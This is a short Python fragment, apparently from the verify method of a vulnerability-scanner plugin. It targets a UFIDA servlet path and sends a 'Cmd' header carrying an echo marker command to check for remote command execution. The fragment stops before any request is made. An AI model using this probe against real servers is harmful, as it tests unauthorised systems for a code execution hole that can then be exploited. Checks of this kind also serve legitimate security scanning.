    def _verify(self):

        result = {}
        path = """/servlet/~ic/com.ufida.zior.console.ActionHandlerServlet"""
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Cmd": "echo 89eD9F481B"
        }
